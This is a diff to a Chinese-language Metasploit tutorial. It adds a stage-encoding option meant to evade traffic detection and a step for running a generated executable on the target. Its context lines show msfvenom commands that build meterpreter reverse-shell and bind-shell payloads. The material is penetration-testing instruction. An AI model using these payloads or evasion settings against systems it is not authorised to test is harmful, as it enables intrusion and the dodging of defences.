@@ -119,7 +119,9 @@ save -> 將當前設置值保存下來，以便下次啟動MSF終端時仍可使
 
 ![image](https://user-images.githubusercontent.com/96654161/170554951-c24df2ab-ee80-46f1-9967-8fca0d3619d4.png)
 >上傳後執行
-
++ 進階設置
+  + advanced
+    + set EnableStageEncoding true //對發送的stage流量進行加密，來對抗流量檢測 默認false
 ### msfvenom
 
 + msfvenom是msfpayload和msfencode的組合，將這兩工具集成在一個框架實例中
@@ -142,7 +144,6 @@ save -> 將當前設置值保存下來，以便下次啟動MSF終端時仍可使
 -x : --template 指定一個特定的可執行文件作為模板
 -k : --keep 保護模板程序的功能 注入payload作為一個新的進程運行
 ```
-
 + linux **(LHOST 跟 LPORT 是對當前選擇的payload設置要回連的地址及端口去做設置)**
   + msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f elf > shell.elf  (反向連接模塊 目標主機主動來連本地主機)
   + msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=<Target IP Address> LPORT=<Port to connect ON> -f elf > shell.elf (本地主機主動連接目標主機)
@@ -229,7 +230,6 @@ save -> 將當前設置值保存下來，以便下次啟動MSF終端時仍可使
       + set lport port (要跟msfvenom設置的port一樣)
       + run
 ![image](https://user-images.githubusercontent.com/96654161/170626579-1812f21f-4768-4eae-8c35-b7a3b1507ec0.png)
-
 ```c=
 // 申請動態內存加載shellcode
 #include <Windows.h>
@@ -285,6 +285,7 @@ main()
 }
   
 ```
+> 運行後會生成test.exe檔案，再把這檔案在攻擊機器上運行起來，msf再去run  
   + linux
     + msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f <language>
   + mac
